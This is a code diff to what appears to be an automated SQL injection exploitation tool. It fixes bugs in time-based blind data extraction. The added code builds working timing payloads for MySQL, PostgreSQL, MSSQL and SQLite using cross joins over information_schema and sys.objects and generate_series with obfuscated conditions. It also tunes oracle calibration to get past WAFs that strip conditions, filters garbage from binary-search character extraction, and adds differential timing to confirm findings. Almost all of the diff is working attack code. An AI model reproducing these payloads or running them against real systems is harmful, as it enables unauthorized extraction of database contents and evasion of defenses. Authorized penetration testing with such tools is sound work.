@@ -21559,6 +21559,20 @@ def is_garbage_data(extracted_string: str) -> bool:
     )
     if len(extracted_string) > 0 and non_printable / len(extracted_string) > 0.2:
         return True
+
+    # Layer 2b: Unicode supplementary plane garbage detection (BUG-GARBAGE-HIGHUNI FIX)
+    # Characters with codepoint > U+FFFF (above the Basic Multilingual Plane) appear in
+    # DBMS extraction output ONLY when the timing binary search oracle malfunctions:
+    # either the condition is always-true (WAF strips it) causing binary search to
+    # converge to the maximum codepoint (U+10FFFF = 1,114,111 for MySQL ORD()), or
+    # the oracle returns random True/False on every probe producing random high codepoints.
+    # Real DBMS metadata (version strings, database names, usernames, table names) consists
+    # entirely of ASCII printable chars (U+0020–U+007E) and at most Latin-1 extended
+    # (U+0080–U+00FF).  Codepoints above U+FFFF never appear in real metadata.
+    # Threshold: >10% supplementary-plane chars → garbage.
+    high_unicode = sum(1 for c in extracted_string if ord(c) > 0xFFFF)
+    if len(extracted_string) > 0 and high_unicode / len(extracted_string) > 0.10:
+        return True
     
     # Layer 3: Binary data (too many null bytes >10%)
     null_bytes = extracted_string.count('\x00')
@@ -144829,6 +144843,56 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     mod = T.wrap_in_subquery_where(p, condition, t)
                     if mod: return mod, []
 
+                elif form in ("heavy_computation_mysql", "cross_join_mysql") and dbms in ("MySQL", "MariaDB"):
+                    # BUG-MAKEPAYLOAD-HEAVY-MYSQL-MISSING FIX (CRITICAL):
+                    # heavy_computation_mysql and cross_join_mysql strategy forms were
+                    # not handled here, causing them to fall through to the `else` branch
+                    # which tried SLEEP replacement in the detection payload. If the
+                    # detection payload had no SLEEP (it used heavy_computation instead),
+                    # replace_function_call returned None → fell back to timing_payload()
+                    # (standard SLEEP format). But timing_thresh was calibrated from
+                    # heavy_computation_mysql (e.g. 350ms) while SLEEP(2s) returns ~2200ms.
+                    # Every extraction probe exceeded the threshold → all True →
+                    # binary search converged to max codepoint → garbage Unicode output.
+                    # Fix: Reconstruct the heavy_computation/cross_join payload directly
+                    # using the extraction condition. The detection payload `p` provides
+                    # the injection prefix (parameter value + injection point).
+                    _ocond = _obfuscate_cond(condition)
+                    if form == "heavy_computation_mysql":
+                        _hcm_delay = (f"(SELECT count(*) FROM information_schema.tables a,"
+                                      f"information_schema.tables b WHERE ({_ocond}) LIMIT 5000000)")
+                        return p + f" AND {_hcm_delay}>=0-- -", []
+                    else:  # cross_join_mysql
+                        _cjm_delay = (f"(SELECT count(*) FROM information_schema.tables a,"
+                                      f"information_schema.tables b,information_schema.tables c "
+                                      f"WHERE ({_ocond}) LIMIT 1000000)")
+                        return p + f" AND {_cjm_delay}>=0-- -", []
+
+                elif form in ("heavy_computation_pg", "cross_join_pg") and dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    # BUG-MAKEPAYLOAD-HEAVY-PG-MISSING FIX (HIGH): Same issue as heavy_computation_mysql.
+                    _ocond = _obfuscate_cond(condition)
+                    if form == "heavy_computation_pg":
+                        _hcp_delay = (f"(SELECT count(*) FROM generate_series(1, "
+                                      f"CASE WHEN ({_ocond}) THEN 5000000 ELSE 1 END))")
+                        return p + f" AND {_hcp_delay}>0-- -", []
+                    else:  # cross_join_pg
+                        _cjp_delay = (f"(SELECT count(*) FROM information_schema.tables a,"
+                                      f"information_schema.tables b WHERE ({_ocond}))")
+                        return p + f" AND {_cjp_delay}>0-- -", []
+
+                elif form in ("heavy_computation_mssql", "cross_join_mssql") and dbms in ("MSSQL", "Sybase"):
+                    # BUG-MAKEPAYLOAD-HEAVY-MSSQL-MISSING FIX (HIGH): Same issue for MSSQL.
+                    _ocond = _obfuscate_cond(condition)
+                    _cjms_delay = f"(SELECT count(*) FROM sys.objects a,sys.objects b WHERE ({_ocond}))"
+                    return p + f" AND {_cjms_delay}>0-- -", []
+
+                elif form in ("heavy_computation_sqlite",) and dbms == "SQLite":
+                    # BUG-MAKEPAYLOAD-HEAVY-SQLITE-MISSING FIX (HIGH): Same issue for SQLite.
+                    _ocond = _obfuscate_cond(condition)
+                    _hcs_delay = (f"(SELECT count(*) FROM generate_series(1, "
+                                  f"CASE WHEN ({_ocond}) THEN 5000000 ELSE 1 END))")
+                    return p + f" AND {_hcs_delay}>0-- -", []
+
                 else:  # "case_when" (default) and unrecognised strategy names
                     # BUG-EXTRACTION-TAMPER-CONDITION FIX: obfuscate condition
                     _ocond = _obfuscate_cond(condition)
@@ -145096,11 +145160,44 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 _strategies = []
             _all_blocked_ms: list = [_std_ms]
 
+            # Always-false counterpart to _tb_cal_true for oracle conditionality checks.
+            _tb_cal_false = "1e0=0e0"
             for _form_name, _form_payload, _form_desc in _strategies:
                 _ms = await _calibrate_probe(_form_payload, [])
                 _all_blocked_ms.append(_ms)
                 if _cal_hit(_ms):
-                    timing_thresh  = max(_ms * 0.75, _base_time + 150)
+                    # BUG-STRAT-NONCOND-ORACLE FIX (CRITICAL): The old code only tested the
+                    # TRUE condition payload during calibration and set threshold at 75% of
+                    # true timing.  For heavy_computation_mysql / cross_join templates, if
+                    # the condition is stripped by the WAF the cross-join executes
+                    # unconditionally (both TRUE and FALSE conditions produce the same
+                    # slow timing). With thresh=75%*true_ms, SLEEP-based extraction probes
+                    # and unconditional heavy_computation payloads BOTH exceed the threshold
+                    # → oracle always True → binary search converges to max codepoint →
+                    # garbage Unicode output accepted as real data.
+                    # Fix: immediately probe a KNOWN-FALSE condition for this strategy form.
+                    # If the false probe also exceeds threshold (margin < 80ms), the oracle
+                    # is non-conditional — skip to next strategy.
+                    # Also use (true+false)/2 as threshold (midpoint) for a robust cutoff.
+                    _false_form_payload = _form_payload.replace(_tb_cal_true, _tb_cal_false, 1)
+                    _strat_false_ms = 0.0
+                    if _false_form_payload != _form_payload:
+                        await asyncio.sleep(0.3)  # avoid rate-limit between calibration probes
+                        _strat_false_ms = await _calibrate_probe(_false_form_payload, [])
+                        _strat_margin = _ms - _strat_false_ms
+                        if _strat_margin < 80:
+                            print(f"[!] [TBExtract] '{_form_name}' non-conditional oracle: "
+                                  f"true={_ms:.0f}ms false={_strat_false_ms:.0f}ms "
+                                  f"margin={_strat_margin:.0f}ms<80ms — WAF likely strips "
+                                  "condition or always-true bias — skipping strategy", flush=True)
+                            LOG.warning("[TBExtract] '%s' non-conditional (margin=%.0fms<80ms) — skip",
+                                        _form_name, _strat_margin)
+                            continue
+                        # Midpoint threshold is more robust than 75%*true
+                        timing_thresh = max((_ms + _strat_false_ms) / 2, _base_time + 80)
+                    else:
+                        # Could not substitute (unexpected payload format) — use 75% heuristic
+                        timing_thresh = max(_ms * 0.75, _base_time + 150)
                     _det_form[0]   = _form_name
                     # Canary probe: verify WAF allows actual extraction conditions.
                     # Calibration only proves CASE WHEN (1=1) passes  WAFs
@@ -146067,7 +146164,13 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
         # extended chars (128-255) as non-printable. Any result with >40% accented
         # chars (é,ü,ç,ñ…) was silently discarded. Only real control chars (<0x20)
         # and DEL (0x7f) should count as noise. Latin-1 128-255 are valid data.
-        _non_print = sum(1 for c in result_str if ord(c) < 0x20 or ord(c) == 0x7f)
+        # BUG-GARBAGE-HIGHUNI FIX (CRITICAL): Also count characters above BMP
+        # (codepoint > U+FFFF) as noise. These appear when the timing binary search
+        # oracle is always-true (WAF strips extraction condition → cross-join executes
+        # unconditionally) causing the search to converge to the maximum char code
+        # (1,114,111 for MySQL ORD()). High supplementary-plane chars like U+F1543,
+        # U+1A4A2 are pure garbage — they never appear in real DBMS metadata.
+        _non_print = sum(1 for c in result_str if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0xFFFF)
         _noise_ratio = _non_print / len(result_str)
         if _noise_ratio > 0.40:
             print(f"[!] [TBExtract] GARBAGE GUARD: {_noise_ratio:.0%} non-printable "
@@ -150099,8 +150202,28 @@ class ExtractionOrchestrator:
         # When unmatched, both calibration probes in _extract_via_detection_template
         # fire SLEEP unconditionally → margin ≈ 0 → calibration fails → extractor aborts.
         # Fix: extend alternation to cover these DBMS-specific probe conditions.
+        #
+        # BUG-DT-FLOAT-COND-MATCH FIX (CRITICAL, MySQL/MariaDB/all DBMSes,
+        # heavy_computation_mysql/cross_join_mysql/generate_series/sys.objects payloads;
+        # _extract_via_detection_template; T/TH/HQ techniques; all surfaces; all methods):
+        # The regex `\d+\s*=\s*\d+` matches only pure-digit sequences. The string
+        # `1e0=1e0` (floating-point always-true/false probe used by heavy_computation
+        # and EBF calibration paths) contains `e` between digits, so `\d+` matches only
+        # `1` or `0` — NOT the full `1e0`. The regex matches substring `0=1` INSIDE
+        # `1e0=1e0` at position 2, producing a broken template: `WHERE (1e[INFERENCE]e0)`.
+        # When calibration substitutes ISNULL(NULL)/ISNULL(1e0), the template becomes
+        # `WHERE (1eISNULL(NULL)e0)` → SQL syntax error → fast error response both probes
+        # → margin ≈ 0ms → "Calibration margin 6ms < 80ms — timing oracle unreliable"
+        # → _extract_via_detection_template returns "" → fallback to _time_based_extract
+        # (which with other fixes produces empty string — correct rejection, but no data).
+        # Root-cause of "[DetTemplate] Calibration margin 6ms < 80ms" in production log.
+        # Fix: build _BDET_NUM (same as _build_det_template's _BDET_NUM) to match integer,
+        # decimal, and scientific-notation floats atomically. Replace \d+\s*=\s*\d+ etc.
+        # with _BDET_NUM equivalents that correctly match `1e0`, `1E-0`, `2.5e3`, etc.
+        # Ordering: specific ISNULL/IS-NULL patterns precede numeric forms for priority.
+        _dt_num = r'(?:\d+(?:\.\d+)?(?:[eE][+-]?\d+)?)'  # integer/decimal/scientific float
         _cond_pat = re.search(
-            r'(\(\s*)?('
+            rf'(\(\s*)?('
             r'ISNULL\s*\(\s*NULL\s*\)'
             r'|ISNULL\s*\(\s*1e0\s*\)'
             r'|1e0\s+IS\s+NOT\s+NULL'
@@ -150109,7 +150232,12 @@ class ExtractionOrchestrator:
             r'|NVL\s*\(\s*NULL\s*,\s*1e0\s*\)\s+IS\s+NULL'
             r'|NULL\s+IS\s+(?:NOT\s+)?NULL'
             r'|true\s*=\s*true|false\s*=\s*false'
-            r'|\d+\s*=\s*\d+|TRUE|FALSE|\d+\s*>\s*\d+|\d+\s*<\s*\d+'
+            # BUG-DT-FLOAT-COND-MATCH FIX: use _dt_num to match integer/float/sci-notation
+            # so `1e0=1e0` is captured as a full unit (not split at `0=1` mid-literal).
+            # Also add != and <> operators matching _build_det_template's _BDET_NUM usage.
+            rf'|{_dt_num}\s*=\s*{_dt_num}|TRUE|FALSE'
+            rf'|{_dt_num}\s*>\s*{_dt_num}|{_dt_num}\s*<\s*{_dt_num}'
+            rf'|{_dt_num}\s*<>\s*{_dt_num}|{_dt_num}\s*!=\s*{_dt_num}'
             r')(\s*\))?',
             _body, re.I)
         if _cond_pat:
@@ -151734,9 +151862,22 @@ class ExtractionOrchestrator:
                         self.method, self.url, self.data, self.data_fmt,
                         self.original, self.tamper_chain, dbms, self.baseline)
                 if _tbe_result:
-                    LOG.info("[Orchestrator] _time_based_extract fallback succeeded: %s",
-                             _tbe_result[:40])
-                    return _tbe_result
+                    # BUG-ORCHESTRATOR-GARBAGE-ACCEPT FIX (HIGH): The fallback accepted
+                    # any truthy result from _time_based_extract without validating it.
+                    # When heavy_computation_mysql threshold (e.g. 350ms) is used but
+                    # extraction falls back to standard SLEEP (which always exceeds 350ms),
+                    # the binary search returns all-True → converges to max codepoint →
+                    # garbage Unicode string returned as "successful" extraction.
+                    # Fix: run is_garbage_data() before accepting the result.
+                    if is_garbage_data(_tbe_result):
+                        LOG.warning("[Orchestrator] _time_based_extract fallback returned "
+                                    "garbage (%.40r) — discarding", _tbe_result)
+                        print(f"[!] [Orchestrator] timing fallback garbage discarded: "
+                              f"{_tbe_result[:40]!r}", flush=True)
+                    else:
+                        LOG.info("[Orchestrator] _time_based_extract fallback succeeded: %s",
+                                 _tbe_result[:40])
+                        return _tbe_result
                 LOG.info("[Orchestrator] _time_based_extract fallback also empty")
             except asyncio.CancelledError:
                 raise
@@ -173233,6 +173374,42 @@ class PoCVerifier:
 
     async def _verify_time(self, result, method, url, data, data_fmt,
                             original, tamper) -> tuple[bool, float]:
+        # BUG-POCVERIFIER-TIMING-THRESH FIX (HIGH, all DBMSes, timing techniques
+        # TH/HQ/heavy_computation_mysql/cross_join timing):
+        # _verify_time always used self.config.time_sec (typically 2.0s = 2000ms) as
+        # the expected timing delta in TemporalAnomalyDetector.is_significant().
+        # But heavy_computation_mysql/cross_join detection payloads produce ~350ms
+        # timing delay (cross-join CPU bound, NOT SLEEP(2s)).  The expected threshold
+        # becomes baseline + 0.75*2000 = baseline + 1500ms, but the heavy payload
+        # only returns ~350ms → is_significant always returns False → all 3 rounds
+        # fail → verified=False → "Finding 'path-injection' failed re-verification".
+        # Fix Part 1: parse the actual sleep duration from the payload using the same
+        # regex used in ExtractionOrchestrator (line ~150887).  For SLEEP/WAITFOR/
+        # pg_sleep payloads, use the extracted value.
+        # Fix Part 2: for heavy_computation payloads (no SLEEP keyword but contains
+        # information_schema cross-join), use a differential timing approach: measure
+        # true-condition minus false-condition timing gap rather than absolute vs.
+        # config.time_sec. This is the only correct approach for oracle-based timings.
+        _det_pl = result.payload or ""
+        _sl_m = _re.search(
+            r"pg_sleep\s*\(\s*([\d.]+)"
+            r"|SLEEP\s*\(\s*([\d.]+)"
+            r"|WAITFOR\s+DELAY\s+['\"\d:]+:(\d+)"
+            r"|DBMS_PIPE\.RECEIVE_MESSAGE\s*\([^,]+,\s*([\d.]+)\)"
+            r"|DBMS_SESSION\.SLEEP\s*\(\s*([\d.]+)\)"
+            r"|DBMS_LOCK\.SLEEP\s*\(\s*([\d.]+)\)",
+            _det_pl, _re.IGNORECASE)
+        _is_heavy_computation = (
+            ("information_schema" in _det_pl.lower() or "generate_series" in _det_pl.lower()
+             or "sys.objects" in _det_pl.lower() or "all_objects" in _det_pl.lower())
+            and not _sl_m
+        )
+        if _sl_m:
+            _g = next((g for g in _sl_m.groups() if g is not None), None)
+            _parsed_sleep = float(_g) if _g else self.config.time_sec
+        else:
+            _parsed_sleep = self.config.time_sec
+
         detector = TemporalAnomalyDetector()
         # Record 3 baseline readings first
         for _ in range(3):
@@ -173243,14 +173420,45 @@ class PoCVerifier:
             except Exception:
                 pass
 
+        # For heavy_computation payloads (no SLEEP, cross-join timing), derive a
+        # false-condition payload for differential timing verification.
+        # The detection payload uses heavy_computation WHERE (condition) — when condition
+        # is always-false (stripped by WAF or forced false), the cross-join runs in
+        # 0ms (not heavy).  We manufacture a false-condition control by replacing the
+        # true calibration marker with the false one.
+        _heavy_false_payload = None
+        if _is_heavy_computation:
+            _hcm_true_markers  = ["1e0=1e0", "1=1", "1<2", "TRUE"]
+            _hcm_false_markers = ["1e0=0e0", "1=2", "1>2", "FALSE"]
+            for _tm, _fm in zip(_hcm_true_markers, _hcm_false_markers):
+                if _tm.lower() in _det_pl.lower():
+                    _heavy_false_payload = _re.sub(
+                        _re.escape(_tm), _fm, _det_pl, count=1, flags=_re.IGNORECASE)
+                    break
+
         successes = 0
         for _ in range(self.VERIFY_ROUNDS):
             try:
                 fp = await _send_injected(self.engine, method, url, data, data_fmt,
                                           result.param, original + result.payload, tamper)
-                is_sig, _ = detector.is_significant(fp.elapsed_ms, self.config.time_sec)
-                if is_sig:
-                    successes += 1
+                if _is_heavy_computation and _heavy_false_payload is not None:
+                    # Differential timing: compare true-condition vs false-condition.
+                    # Heavy computation is only a valid oracle when true ms >> false ms.
+                    try:
+                        fp_f = await _send_injected(
+                            self.engine, method, url, data, data_fmt,
+                            result.param, original + _heavy_false_payload, tamper)
+                        _true_ms  = getattr(fp,   'elapsed_ms', 0.0) or 0.0
+                        _false_ms = getattr(fp_f, 'elapsed_ms', 0.0) or 0.0
+                        _margin   = _true_ms - _false_ms
+                        if _margin >= 80:  # 80ms discriminating margin
+                            successes += 1
+                    except Exception:
+                        pass
+                else:
+                    is_sig, _ = detector.is_significant(fp.elapsed_ms, _parsed_sleep)
+                    if is_sig:
+                        successes += 1
             except Exception:
                 pass
         verified = successes >= 2
